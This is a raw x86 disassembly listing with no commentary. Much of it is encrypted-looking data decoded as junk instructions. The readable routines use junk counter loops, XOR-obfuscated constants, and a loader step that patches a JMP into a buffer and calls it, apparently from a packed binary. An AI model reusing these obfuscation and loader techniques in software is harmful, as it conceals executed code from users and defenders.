  406f37:	adc    DWORD PTR [ecx-0x185f9cd2],edx
  406f3d:	pop    ebx
  406f3e:	(bad)  
  406f3f:	xchg   ebx,eax
  406f40:	dec    esi
  406f41:	push   esi
  406f42:	call   FWORD PTR [edx]
  406f44:	(bad)  
  406f45:	xlat   BYTE PTR ds:[ebx]
  406f46:	fldpi  
  406f48:	add    edx,esp
  406f4a:	mov    WORD PTR [edi-0x5b],ds
  406f4d:	in     eax,0xad
  406f4f:	add    ah,0x48
  406f52:	jae    0x406f67
  406f54:	imul   ebx,esp,0x625634e9
  406f5a:	add    eax,0x6f8bca54
  406f5f:	pop    es
  406f60:	test   eax,0xe8c7eceb
  406f65:	loopne 0x406fa6
  406f67:	out    0xd9,al
  406f69:	les    ebp,FWORD PTR [esp+esi*8+0x78]
  406f6d:	push   0x3d
  406f6f:	retf   0xd685
  406f72:	xor    BYTE PTR ds:[eax+edx*4+0x1f],ah
  406f77:	sub    edi,DWORD PTR [ecx]
  406f79:	ins    DWORD PTR es:[edi],dx
  406f7a:	fstp   DWORD PTR [ecx]
  406f7c:	push   ss
  406f7d:	aaa    
  406f7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f7f:	jle    0x406fef
  406f81:	lods   al,BYTE PTR ds:[esi]
  406f82:	inc    esp
  406f83:	mov    edx,0x75b8b554
  406f88:	adc    BYTE PTR [ecx],cl
  406f8a:	into   
  406f8b:	(bad)  [ebx]
  406f8d:	aas    
  406f8e:	rol    DWORD PTR [edx-0x6a],0xb1
  406f92:	push   0x34
  406f94:	in     eax,dx
  406f95:	fldlg2 
  406f97:	adc    eax,0x227b31a3
  406f9c:	ds shr eax,cl
  406f9f:	(bad)  
  406fa0:	in     eax,dx
  406fa1:	cs cmp al,0x76
  406fa4:	or     al,0x9b
  406fa6:	mov    esi,DWORD PTR [eax-0x15]
  406fa9:	gs shr al,cl
  406fac:	cs ins DWORD PTR es:[edi],dx
  406fae:	xchg   esp,eax
  406faf:	stos   BYTE PTR es:[edi],al
  406fb0:	xchg   edx,eax
  406fb1:	hlt    
  406fb2:	mov    DWORD PTR [edi],ebp
  406fb4:	push   ds
  406fb5:	xchg   ebx,eax
  406fb6:	xor    BYTE PTR [edx+0x6cd8a743],0x0
  406fbd:	pop    ecx
  406fbe:	test   BYTE PTR [esi+0x5a11fa28],cl
  406fc4:	fiadd  DWORD PTR [edi+0x78]
  406fc7:	xor    esp,edi
  406fc9:	adc    edi,DWORD PTR [ebp+0xc80f113]
  406fcf:	pop    edi
  406fd0:	sub    al,0xf3
  406fd2:	lock leave 
  406fd4:	adc    esp,DWORD PTR [edi-0x5c]
  406fd7:	sbb    ebp,DWORD PTR [edi+ecx*4]
  406fda:	lds    edi,FWORD PTR [ebx]
  406fdc:	xchg   esp,eax
  406fdd:	retf   
  406fde:	dec    edi
  406fdf:	jne    0x406f9d
  406fe1:	xchg   ecx,eax
  406fe2:	sbb    BYTE PTR [ecx+0x57],al
  406fe5:	add    BYTE PTR [esi],0x60
  406fe8:	in     al,dx
  406fe9:	jno    0x406ffc
  406feb:	jo     0x406f98
  406fed:	in     al,dx
  406fee:	enter  0xdd88,0x56
  406ff2:	(bad)  
  406ff3:	int3   
  406ff4:	xchg   ebx,eax
  406ff5:	inc    ebp
  406ff6:	test   eax,0x5b3e2cf5
  406ffb:	loope  0x406fcc
  406ffd:	ss pusha 
  406fff:	retf   0x8201
  407002:	dec    edx
  407003:	retf   
  407004:	sub    edi,DWORD PTR [eax+0x47b318de]
  40700a:	aam    0x7d
  40700c:	mov    edx,0x6e8f7e16
  407011:	iret   
  407012:	int    0xb1
  407014:	dec    edi
  407015:	pusha  
  407016:	inc    esi
  407017:	fidivr DWORD PTR [ecx-0x5c]
  40701a:	pop    edx
  40701b:	lahf   
  40701c:	call   0xa0c7:0x71077c78
  407023:	jecxz  0x406fb8
  407025:	fcmovu st,st(7)
  407027:	and    ah,bl
  407029:	cmp    al,0x88
  40702b:	xor    al,0x99
  40702d:	jbe    0x407038
  40702f:	or     dl,bh
  407031:	in     eax,dx
  407032:	and    al,0xc
  407034:	je     0x407098
  407036:	sub    eax,0x6592d8a1
  40703b:	fdivp  st(6),st
  40703d:	dec    ecx
  40703e:	stc    
  40703f:	stos   DWORD PTR es:[edi],eax
  407040:	jo     0x407067
  407042:	xchg   esp,eax
  407043:	or     DWORD PTR [eax],esi
  407045:	arpl   WORD PTR [ebx],bp
  407047:	scas   al,BYTE PTR es:[edi]
  407048:	cmp    dh,BYTE PTR [eax]
  40704a:	int    0xdb
  40704c:	jecxz  0x407064
  40704e:	mov    bh,0xd1
  407050:	jge    0x406fe3
  407052:	(bad)  
  407054:	jle    0x406fe0
  407056:	fdivr  QWORD PTR es:[esi]
  407059:	popa   
  40705a:	sahf   
  40705b:	imul   esp,DWORD PTR [esi-0x471c1c00],0x28893d11
  407065:	jecxz  0x40702c
  407067:	cdq    
  407068:	or     DWORD PTR [eax+0x7e],0x65620fad
  40706f:	shl    ch,0x71
  407072:	jmp    0x507357d4
  407077:	mov    al,ds:0xfa890dba
  40707c:	(bad)  
  40707d:	push   ebx
  40707e:	mov    ch,0x7d
  407080:	inc    ebx
  407081:	das    
  407082:	dec    edx
  407083:	push   ds
  407084:	mov    edx,DWORD PTR [edi-0x4ad7cb4e]
  40708a:	bound  eax,QWORD PTR [ebx+0x4405b716]
  407090:	hlt    
  407091:	(bad)  
  407092:	fwait
  407093:	scas   eax,DWORD PTR es:[edi]
  407094:	call   0xc7cf08fa
  407099:	dec    ecx
  40709a:	fs out 0xb7,al
  40709d:	sub    ebp,DWORD PTR [eax+ebp*2+0x4688f808]
  4070a4:	nop
  4070a5:	xchg   esp,eax
  4070a6:	inc    ecx
  4070a7:	loope  0x40707a
  4070a9:	jns    0x407093
  4070ab:	ja     0x40708a
  4070ad:	dec    esp
  4070ae:	ins    BYTE PTR es:[edi],dx
  4070af:	jnp    0x407081
  4070b1:	imul   edi,DWORD PTR [edx],0xffffffe2
  4070b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070b5:	sub    eax,0x57641fc
  4070ba:	inc    esp
  4070bb:	cmp    WORD PTR [ebp+0x21],0x2
  4070c0:	inc    ecx
  4070c1:	aaa    
  4070c2:	pop    ds
  4070c3:	enter  0x4bc8,0xc5
  4070c7:	fbstp  TBYTE PTR [edi-0x374526e9]
  4070cd:	(bad)  
  4070cf:	push   eax
  4070d0:	cwde   
  4070d1:	jmp    0x4070aa
  4070d3:	sub    esi,DWORD PTR [eax-0x51]
  4070d6:	adc    esp,DWORD PTR [esi-0x27]
  4070d9:	pop    ebx
  4070da:	push   0x75
  4070dc:	xchg   ebx,eax
  4070dd:	mov    DWORD PTR [esi+0x3d275c6c],edx
  4070e3:	callw  0xebc7
  4070e7:	and    eax,0xb544a070
  4070ec:	ds mov esi,0x7c636220
  4070f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070f3:	and    BYTE PTR [edi+0x18],dh
  4070f6:	test   eax,0xa6c3baed
  4070fb:	fistp  DWORD PTR [eax+0x492f6389]
  407101:	xchg   edi,eax
  407102:	mov    edi,0x4369d744
  407107:	ins    DWORD PTR es:[edi],dx
  407108:	sub    eax,0xaec9ee72
  40710d:	xor    DWORD PTR [eax-0x27],0x7219f3a6
  407114:	pop    ecx
  407115:	popa   
  407116:	xor    eax,0x7fa26e78
  40711b:	cmp    al,0x88
  40711d:	imul   ebx,DWORD PTR [edi+edi*1],0x3d0e8280
  407124:	add    ecx,ebp
  407126:	nop
  407127:	sbb    DWORD PTR ds:0x32a43338,esp
  40712d:	jo     0x40717e
  40712f:	mov    ah,0x96
  407131:	pop    ebx
  407132:	mov    edx,0xe580429d
  407137:	arpl   WORD PTR [ecx+0x16c62d6],bp
  40713d:	hlt    
  40713e:	inc    ecx
  40713f:	cld    
  407140:	sbb    BYTE PTR [ecx+eax*2],bl
  407143:	cli    
  407144:	and    al,0x7b
  407146:	out    0x4f,eax
  407148:	lock push es
  40714a:	and    ecx,DWORD PTR [eax-0x30]
  40714d:	jle    0x4070f1
  40714f:	mov    ds:0x915dae38,eax
  407154:	pop    ebp
  407155:	cwde   
  407156:	adc    edi,eax
  407158:	inc    ebp
  407159:	das    
  40715a:	(bad)  
  40715b:	fmul   QWORD PTR [ecx]
  40715d:	cmc    
  40715e:	jno    0x4071dd
  407160:	sahf   
  407161:	mov    DWORD PTR [ecx+0x4d9f85ea],esp
  407167:	(bad)  ds:0x509bad69
  40716d:	rcl    BYTE PTR [eax-0x4f],1
  407170:	pushf  
  407171:	adc    esp,DWORD PTR [esi+0x57714b63]
  407177:	sbb    DWORD PTR [ebp+0x3ffb3939],ebp
  40717d:	inc    eax
  40717e:	pop    esp
  40717f:	pop    edx
  407180:	cmp    esi,DWORD PTR [ebx]
  407182:	mov    edi,0x226e7c19
  407187:	xor    ecx,DWORD PTR [edx]
  407189:	push   edi
  40718a:	mov    ds:0xdb84cbf,eax
  40718f:	mov    edi,0xbc8b8372
  407194:	add    al,dh
  407196:	mov    al,0x3
  407198:	sub    esp,0xc70f66f
  40719e:	mov    DWORD PTR [edx-0xce09fa3],ebx
  4071a4:	rol    DWORD PTR [edi],1
  4071a6:	das    
  4071a7:	xchg   esp,eax
  4071a8:	pop    ds
  4071a9:	sahf   
  4071aa:	push   ebp
  4071ab:	pop    ecx
  4071ac:	or     al,0xd5
  4071ae:	fnstenv [edx+0x55bfc2c2]
  4071b4:	xor    ebx,DWORD PTR [eax]
  4071b6:	sub    eax,0xd807c8b1
  4071bb:	lea    esp,[esp+esi*1]
  4071be:	mov    edi,DWORD PTR [ebx-0x24]
  4071c1:	ficom  DWORD PTR [ebx+ebp*2-0x612b21d7]
  4071c8:	xor    DWORD PTR [edx],ebx
  4071ca:	sahf   
  4071cb:	ins    DWORD PTR es:[edi],dx
  4071cc:	pushfw 
  4071ce:	mov    esp,0xbab3ae3a
  4071d3:	lods   eax,DWORD PTR ds:[esi]
  4071d4:	push   edx
  4071d5:	dec    edx
  4071d6:	aad    0x67
  4071d8:	mov    ch,BYTE PTR [ebx-0x6d0b1082]
  4071de:	adc    al,0xf4
  4071e0:	sbb    dl,BYTE PTR [edx+ebp*8+0x7618aff5]
  4071e7:	dec    edi
  4071e8:	inc    esp
  4071e9:	scas   al,BYTE PTR es:[edi]
  4071ea:	add    ch,bh
  4071ec:	adc    DWORD PTR [ecx-0x1e789f21],edi
  4071f2:	addr16 add bh,al
  4071f5:	jo     0x4071c2
  4071f7:	xor    al,0x31
  4071f9:	or     DWORD PTR [ecx-0x5b8c2850],esi
  4071ff:	xor    al,0xfd
  407201:	into   
  407202:	xchg   ebx,eax
  407203:	push   esp
  407204:	scas   eax,DWORD PTR es:[edi]
  407205:	imul   edi,eax,0xc8e5cf4e
  40720b:	dec    ebx
  40720c:	pop    edi
  40720d:	xor    BYTE PTR [ecx+0x336b4bf1],bl
  407213:	sar    DWORD PTR [edx+0x3272dd],0x3
  40721a:	ret    0x4589
  40721d:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  407223:	add    eax,edx
  407225:	mov    edx,DWORD PTR [ebp+0x14]
  407228:	imul   eax,DWORD PTR [edx]
  40722b:	mov    edx,DWORD PTR [ebp-0x4]
  40722e:	xor    edx,ecx
  407230:	mov    ecx,DWORD PTR [ebp+0x8]
  407233:	lea    ecx,[edx+ecx*1+0x3272dd]
  40723a:	cmp    ecx,eax
  40723c:	je     0x4072b3
  407242:	mov    edi,DWORD PTR [ebp-0x14]
  407245:	mov    eax,DWORD PTR [ebp+0x8]
  407248:	mov    edx,DWORD PTR [ebp+0x14]
  40724b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40724f:	mov    ecx,0x7510896
  407254:	xor    edx,edx
  407256:	xor    edi,ecx
  407258:	mov    esi,0x3272dd
  40725d:	add    edi,esi
  40725f:	div    edi
  407261:	mov    edx,DWORD PTR [ebp-0x4]
  407264:	xor    edx,ecx
  407266:	lea    eax,[edx+eax*1+0x3272dd]
  40726d:	mov    edx,DWORD PTR [ebp+0x8]
  407270:	mov    edi,DWORD PTR [ebp-0x20]
  407273:	mov    DWORD PTR [edi+edx*4],eax
  407276:	mov    eax,DWORD PTR [ebp-0x14]
  407279:	mov    edx,DWORD PTR [ebp+0x8]
  40727c:	xor    eax,ecx
  40727e:	lea    eax,[eax+edx*1+0x3272dd]
  407285:	mov    DWORD PTR [ebp+0x8],eax
  407288:	mov    eax,DWORD PTR [ebp-0x14]
  40728b:	mov    edx,DWORD PTR [ebp+0x14]
  40728e:	xor    eax,ecx
  407290:	add    eax,esi
  407292:	imul   eax,DWORD PTR [edx]
  407295:	mov    edx,DWORD PTR [ebp-0x4]
  407298:	xor    edx,ecx
  40729a:	mov    ecx,DWORD PTR [ebp+0x8]
  40729d:	lea    ecx,[edx+ecx*1+0x3272dd]
  4072a4:	cmp    ecx,eax
  4072a6:	jne    0x407242
  4072ac:	mov    eax,esi
  4072ae:	jmp    0x4072b8
  4072b3:	mov    eax,0x3272dd
  4072b8:	mov    ebx,0x7510896
  4072bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4072c0:	xor    ecx,ebx
  4072c2:	add    ecx,eax
  4072c4:	mov    DWORD PTR [ebp-0xc],ecx
  4072c7:	mov    ebx,0x65655
  4072cc:	add    ebx,0x3234
  4072d2:	xchg   ebx,esi
  4072d4:	xor    ebx,ebx
  4072d6:	push   esi
  4072d7:	mov    esi,ebx
  4072d9:	pop    ebx
  4072da:	mov    edx,esi
  4072dc:	add    ebx,0x1002
  4072e2:	lea    eax,[ebp-0x10]
  4072e5:	add    edx,eax
  4072e7:	add    edx,0x5
  4072ea:	push   edx
  4072eb:	inc    esi
  4072ec:	pop    ecx
  4072ed:	dec    ecx
  4072ee:	xchg   ecx,eax
  4072ef:	dec    eax
  4072f0:	xchg   ecx,eax
  4072f1:	dec    ecx
  4072f2:	xchg   ecx,edx
  4072f4:	dec    edx
  4072f5:	push   edx
  4072f6:	mov    edx,ebx
  4072f8:	pop    ebx
  4072f9:	dec    ebx
  4072fa:	call   DWORD PTR [ebx]
  4072fc:	cmp    DWORD PTR [ebp+0x10],esi
  4072ff:	je     0x40731e
  407305:	xchg   edx,eax
  407306:	push   0xb
  407308:	pop    ecx
  407309:	push   0x4
  40730b:	pop    ebx
  40730c:	inc    ebx
  40730d:	xchg   ebx,ecx
  40730f:	sub    ebx,ecx
  407311:	xchg   ebx,ecx
  407313:	dec    ecx
  407314:	dec    ecx
  407315:	mov    eax,DWORD PTR [ebp-0x1c]
  407318:	imul   eax,ecx
  40731b:	add    esp,eax
  40731d:	xchg   edx,eax
  40731e:	push   eax
  40731f:	xor    ebx,ebx
  407321:	mov    edx,esp
  407323:	dec    edx
  407324:	inc    ebx
  407325:	add    ebx,DWORD PTR [edx+ebx*1]
  407328:	dec    ebx
  407329:	xor    edx,edx
  40732b:	add    DWORD PTR [ebp-0xc],ebx
  40732e:	pop    ebx
  40732f:	mov    eax,DWORD PTR [ebp-0xc]
  407332:	pop    edi
  407333:	pop    esi
  407334:	pop    ebx
  407335:	leave  
  407336:	ret    0x10
  407339:	push   ebp
  40733a:	mov    ebp,esp
  40733c:	sub    esp,0x7c
  40733f:	and    DWORD PTR ds:0x420e92,0x0
  407349:	jmp    0x40735b
  40734e:	mov    ecx,DWORD PTR ds:0x420e92
  407354:	inc    ecx
  407355:	mov    DWORD PTR ds:0x420e92,ecx
  40735b:	cmp    DWORD PTR ds:0x420e92,0x15
  407362:	jae    0x4073cc
  407368:	cmp    DWORD PTR ds:0x420e92,0x1f
  40736f:	jne    0x407388
  407375:	push   0x3dd4
  40737a:	push   0x422018
  40737f:	push   DWORD PTR [ebp-0xc]
  407382:	call   DWORD PTR ds:0x4247e5
  407388:	jmp    0x40734e
  40738d:	mov    DWORD PTR ds:0x420f64,0x1c
  407397:	cmp    DWORD PTR ds:0x420f64,0x0
  40739e:	je     0x4073cc
  4073a4:	cmp    DWORD PTR ds:0x420f64,0x1d
  4073ab:	jne    0x4073b7
  4073b1:	call   DWORD PTR ds:0x4247f1
  4073b7:	mov    eax,ds:0x420f64
  4073bc:	dec    eax
  4073bd:	mov    ds:0x420f64,eax
  4073c2:	jmp    0x407397
  4073c7:	adc    eax,0x653
  4073cc:	push   esi
  4073cd:	and    DWORD PTR ds:0x42200c,0x0
  4073d7:	jmp    0x4073e9
  4073dc:	mov    esi,DWORD PTR ds:0x42200c
  4073e2:	inc    esi
  4073e3:	mov    DWORD PTR ds:0x42200c,esi
  4073e9:	cmp    DWORD PTR ds:0x42200c,0x16
  4073f0:	jae    0x40742e
  4073f6:	cmp    DWORD PTR ds:0x42200c,0xa
  4073fd:	jne    0x407409
  407403:	call   DWORD PTR ds:0x4247f5
  407409:	cmp    DWORD PTR ds:0x42200c,0x9
  407410:	jne    0x407423
  407416:	mov    esi,DWORD PTR ds:0x42200c
  40741c:	inc    esi
  40741d:	mov    DWORD PTR ds:0x42200c,esi
  407423:	jmp    0x4073dc
  407428:	sbb    DWORD PTR ds:0x420f00,edx
  40742e:	push   edi
  40742f:	mov    eax,ds:0x424435
  407434:	mov    DWORD PTR ds:0x420f70,0x12
  40743e:	cmp    DWORD PTR ds:0x420f70,0x0
  407445:	je     0x40748b
  40744b:	cmp    DWORD PTR ds:0x420f70,0x17
  407452:	jne    0x407479
  407458:	push   0x87b3
  40745d:	push   DWORD PTR [ebp-0x28]
  407460:	push   0x420f68
  407465:	push   0x7b70
  40746a:	push   DWORD PTR [ebp-0x18]
  40746d:	push   DWORD PTR [ebp-0x24]
  407470:	push   DWORD PTR [ebp-0x14]
  407473:	call   DWORD PTR ds:0x4247f9
  407479:	mov    edi,DWORD PTR ds:0x420f70
  40747f:	dec    edi
  407480:	mov    DWORD PTR ds:0x420f70,edi
  407486:	jmp    0x40743e
  40748b:	mov    DWORD PTR [ebp-0x24],eax
  40748e:	mov    eax,ds:0x424541
  407493:	xor    esi,edi
  407495:	mov    DWORD PTR [ebp-0x34],eax
  407498:	and    edi,DWORD PTR ds:0x420f5c
  40749e:	and    DWORD PTR [ebp-0x30],0x0
  4074a2:	and    eax,edi
  4074a4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  4074ab:	adc    DWORD PTR ds:0x420ef0,edx
  4074b1:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  4074b8:	mov    edi,DWORD PTR ds:0x420ec2
  4074be:	mov    eax,ds:0x420f7c
  4074c3:	sub    edi,eax
  4074c5:	sub    edi,DWORD PTR [edi+eax*1]
  4074c8:	mov    eax,DWORD PTR [ebp-0x10]
  4074cb:	or     edi,0x1b5b
  4074d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4074d4:	and    DWORD PTR ds:0x420ea2,0x0
  4074de:	xor    esi,esi
  4074e0:	xor    esi,DWORD PTR ds:0x420ea2
  4074e6:	inc    esi
  4074e7:	mov    DWORD PTR ds:0x420ea2,esi
  4074ed:	cmp    DWORD PTR ds:0x420ea2,0x20
  4074f4:	jne    0x407508
  4074fa:	push   DWORD PTR [ebp-0x28]
  4074fd:	push   0x424093
  407502:	call   DWORD PTR ds:0x4247fd
  407508:	cmp    DWORD PTR ds:0x420ea2,0x19
  40750f:	jb     0x4074de
  407515:	sub    eax,ecx
  407517:	and    DWORD PTR ds:0x420fac,0x0
  407521:	xor    ecx,ecx
  407523:	or     ecx,DWORD PTR ds:0x420fac
  407529:	inc    ecx
  40752a:	mov    DWORD PTR ds:0x420fac,ecx
  407530:	cmp    DWORD PTR ds:0x420fac,0x5
  407537:	jne    0x407550
  40753d:	push   0x42414e
  407542:	push   0x0
  407544:	push   DWORD PTR [ebp-0x28]
  407547:	push   DWORD PTR [ebp-0x10]
  40754a:	call   DWORD PTR ds:0x424801
  407550:	cmp    DWORD PTR ds:0x420fac,0x4
  407557:	jne    0x40756a
  40755d:	mov    ecx,DWORD PTR ds:0x420fac
  407563:	inc    ecx
  407564:	mov    DWORD PTR ds:0x420fac,ecx
  40756a:	cmp    DWORD PTR ds:0x420fac,0x16
  407571:	jb     0x407521
  407577:	and    DWORD PTR ds:0x420f9c,0x0
  407581:	jmp    0x407593
  407586:	mov    ecx,DWORD PTR ds:0x420f9c
  40758c:	inc    ecx
  40758d:	mov    DWORD PTR ds:0x420f9c,ecx
  407593:	cmp    DWORD PTR ds:0x420f9c,0x11
  40759a:	jae    0x4075dc
  4075a0:	cmp    DWORD PTR ds:0x420f9c,0x5
  4075a7:	jne    0x4075bd
  4075ad:	push   0x420f74
  4075b2:	push   0x1cd6
  4075b7:	call   DWORD PTR ds:0x424805
  4075bd:	cmp    DWORD PTR ds:0x420f9c,0x4
  4075c4:	jne    0x4075d7
  4075ca:	mov    ecx,DWORD PTR ds:0x420f9c
  4075d0:	inc    ecx
  4075d1:	mov    DWORD PTR ds:0x420f9c,ecx
  4075d7:	jmp    0x407586
  4075dc:	mov    DWORD PTR [ebp-0x10],eax
  4075df:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  4075e6:	mov    eax,DWORD PTR [ebp-0x18]
  4075e9:	mov    ecx,DWORD PTR [ebp-0x18]
  4075ec:	sub    eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x18],eax
  4075f1:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4075f8:	mov    eax,DWORD PTR [ebp-0xc]
  4075fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4075fe:	sub    eax,ecx
  407600:	mov    DWORD PTR [ebp-0xc],eax
  407603:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40760a:	mov    eax,DWORD PTR [ebp-0x1c]
  40760d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407610:	sub    eax,ecx
  407612:	mov    DWORD PTR [ebp-0x1c],eax
  407615:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40761c:	mov    eax,DWORD PTR [ebp-0x20]
  40761f:	mov    ecx,DWORD PTR [ebp-0x20]
  407622:	sub    eax,ecx
  407624:	mov    DWORD PTR [ebp-0x20],eax
  407627:	mov    eax,DWORD PTR [ebp-0x2c]
  40762a:	mov    ecx,DWORD PTR [ebp-0x20]
  40762d:	mov    esi,0x7510896
  407632:	xor    eax,esi
  407634:	mov    edi,0x3272dd
  407639:	add    eax,edi
  40763b:	or     eax,ecx
  40763d:	mov    DWORD PTR [ebp-0x20],eax
  407640:	mov    eax,DWORD PTR [ebp-0x4]
  407643:	mov    ecx,DWORD PTR [ebp-0x4]
  407646:	sub    eax,ecx
  407648:	mov    DWORD PTR [ebp-0x4],eax
  40764b:	or     DWORD PTR [ebp-0x4],0xf89c85be
  407652:	mov    eax,DWORD PTR [ebp-0xc]
  407655:	xor    eax,esi
  407657:	add    eax,edi
  407659:	push   eax
  40765a:	mov    eax,DWORD PTR [ebp-0x10]
  40765d:	xor    eax,esi
  40765f:	add    eax,edi
  407661:	push   eax
  407662:	mov    eax,DWORD PTR [ebp-0x4]
  407665:	xor    eax,esi
  407667:	add    eax,edi
  407669:	push   eax
  40766a:	lea    eax,[ebp-0x7c]
  40766d:	push   eax
  40766e:	push   DWORD PTR [ebp-0x2c]
  407671:	push   DWORD PTR [ebp-0x28]
  407674:	call   0x410b90
  407679:	test   eax,eax
  40767b:	je     0x4076a9
  407681:	lea    eax,[ebp-0x7c]
  407684:	push   eax
  407685:	mov    eax,DWORD PTR [ebp-0x28]
  407688:	xor    eax,esi
  40768a:	add    eax,edi
  40768c:	push   eax
  40768d:	mov    eax,DWORD PTR [ebp-0x24]
  407690:	add    eax,0xaa
  407695:	push   eax
  407696:	mov    eax,DWORD PTR [ebp-0x24]
  407699:	mov    eax,DWORD PTR [eax+0x198]
  40769f:	push   DWORD PTR [eax]
  4076a1:	call   0x402470
  4076a6:	mov    DWORD PTR [ebp-0x14],eax
  4076a9:	lea    eax,[ebp+0x4]
  4076ac:	mov    DWORD PTR [ebp-0x30],eax
  4076af:	mov    eax,DWORD PTR [ebp-0x14]
  4076b2:	test   eax,eax
  4076b4:	je     0x40771c
  4076ba:	lea    eax,[ebp-0x8]
  4076bd:	mov    DWORD PTR [ebp-0x38],eax
  4076c0:	mov    eax,DWORD PTR [ebp-0x34]
  4076c3:	mov    DWORD PTR [ebp-0x8],eax
  4076c6:	mov    eax,DWORD PTR [ebp-0x8]
  4076c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4076cc:	sub    eax,ecx
  4076ce:	mov    DWORD PTR [ebp-0x8],eax
  4076d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4076d4:	xor    ecx,esi
  4076d6:	mov    eax,0xffcd8d23
  4076db:	sub    eax,ecx
  4076dd:	add    DWORD PTR [ebp-0x8],eax
  4076e0:	mov    eax,DWORD PTR [ebp-0x8]
  4076e3:	mov    ecx,DWORD PTR [ebp-0x14]
  4076e6:	mov    DWORD PTR [ecx+0x1],eax
  4076e9:	mov    eax,DWORD PTR [ebp-0x14]
  4076ec:	push   DWORD PTR [ebp-0x24]
  4076ef:	mov    BYTE PTR [eax],0xe9
  4076f2:	mov    eax,ds:0x4242b1
  4076f7:	push   DWORD PTR [eax]
  4076f9:	push   DWORD PTR ds:0x42450d
  4076ff:	push   DWORD PTR ds:0x4242b9
  407705:	push   DWORD PTR ds:0x4244ed
  40770b:	push   DWORD PTR ds:0x4245a5
  407711:	push   DWORD PTR [ebp-0x28]
  407714:	push   DWORD PTR [ebp-0x2c]
  407717:	mov    eax,DWORD PTR [ebp-0x14]
  40771a:	call   eax
  40771c:	mov    eax,DWORD PTR [ebp-0x30]
  40771f:	mov    ecx,DWORD PTR ds:0x4244b1
  407725:	add    DWORD PTR [eax],ecx
  407727:	pop    edi
  407728:	pop    esi
  407729:	leave  
  40772a:	ret    
  40772b:	push   ebp
  40772c:	mov    ebp,esp
  40772e:	sub    esp,0x18
  407731:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  407738:	lea    eax,[ebp+0x14]
  40773b:	mov    DWORD PTR [ebp-0x4],eax
  40773e:	jmp    0x409ab8
  407743:	das    
  407744:	or     DWORD PTR [eax+0x13b778ea],edx
  40774a:	mov    esp,DWORD PTR [esi-0x10]
  40774d:	in     eax,0x6d
  40774f:	daa    
  407750:	pop    ebp
  407751:	(bad)  
  407752:	aad    0x9a
  407754:	and    BYTE PTR [edx+0x7a],bh
  407757:	sbb    DWORD PTR [edi+0x7a],ebx
  40775a:	jp     0x407734
  40775c:	fisttp DWORD PTR [esi+0x66]
  40775f:	and    ch,BYTE PTR [eax-0x4ed7ac07]
  407765:	xor    dl,BYTE PTR ds:0x433ea47e
  40776b:	jmp    0xed15:0xa12b35f5
  407772:	imul   ebp,DWORD PTR [edi],0x6c537d56
  407778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407779:	and    eax,0xe2a483c8
  40777e:	mov    ebp,0x824359f4
  407783:	pop    ebx
  407784:	out    dx,al
  407785:	jmp    0xf84b9ab2
  40778a:	popf   
  40778b:	ds in  al,0xbf
  40778e:	jnp    0x4077cf
  407790:	retf   0x1b41
  407793:	mov    ah,0x93
  407795:	push   cs
  407796:	inc    edi
  407797:	repnz loope 0x407733
  40779a:	jb     0x40775f
  40779c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40779d:	mov    al,0x3f
  40779f:	jno    0x407767
  4077a1:	bswap  edx
  4077a3:	and    al,0xde
  4077a5:	xchg   ebp,eax
  4077a6:	je     0x407743
  4077a8:	daa    
  4077a9:	fisubr DWORD PTR [edi]
  4077ab:	js     0x4077dd
  4077ad:	mov    ds:0x472d7097,eax
  4077b2:	dec    ecx
  4077b3:	push   eax
  4077b4:	retf   0xb05c
  4077b7:	loop   0x4077ba
  4077b9:	xlat   BYTE PTR ds:[ebx]
  4077ba:	or     dh,BYTE PTR [edx-0xf794d18]
  4077c0:	push   edx
  4077c1:	adc    DWORD PTR [eax*2+0x7635dee4],edx
  4077c8:	aad    0x0
  4077ca:	ins    DWORD PTR es:[edi],dx
  4077cb:	(bad)  
  4077cc:	jmp    FWORD PTR [ebp-0x2e]
  4077cf:	inc    ebp
  4077d0:	scas   eax,DWORD PTR es:[edi]
  4077d1:	add    al,0x45
  4077d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077d4:	jno    0x40780b
  4077d6:	fidiv  DWORD PTR [esi+0x4b1e2453]
  4077dc:	cmp    eax,0x281a3def
  4077e1:	lods   eax,DWORD PTR ds:[esi]
  4077e2:	xchg   edx,eax
  4077e3:	cmp    al,0xac
  4077e5:	hlt    
  4077e6:	mov    ch,0x1c
  4077e8:	adc    ecx,DWORD PTR [edx-0x5e32755e]
  4077ee:	lea    edx,[eax]
  4077f0:	dec    ebp
  4077f1:	mov    dh,0x3d
  4077f3:	lods   al,BYTE PTR ds:[esi]
  4077f4:	xor    ebx,DWORD PTR [esi]
  4077f6:	and    al,0x68
  4077f8:	outs   dx,BYTE PTR ds:[esi]
  4077f9:	xchg   ecx,eax
  4077fa:	add    eax,0x95849cf6
  4077ff:	inc    esp
  407800:	xchg   ah,ch
  407802:	imul   eax,eax,0x401b60c3
  407808:	sahf   
  407809:	push   ecx
  40780a:	xor    al,0x61
  40780c:	out    0x63,al
  40780e:	inc    edi
  40780f:	jg     0x40781e
  407811:	loop   0x407859
  407813:	mov    dh,0x10
  407815:	jne    0x4077e9
  407817:	dec    ebp
  407818:	je     0x407847
  40781a:	jg     0x407862
  40781c:	fist   WORD PTR [edx-0x74]
  40781f:	fwait
  407820:	ins    DWORD PTR es:[edi],dx
  407821:	jge    0x40788e
  407823:	ss dec esp
  407825:	xchg   esi,eax
  407826:	icebp  
  407827:	sbb    DWORD PTR [ebp+0x7423e37b],ebx
  40782d:	sbb    al,0x6b
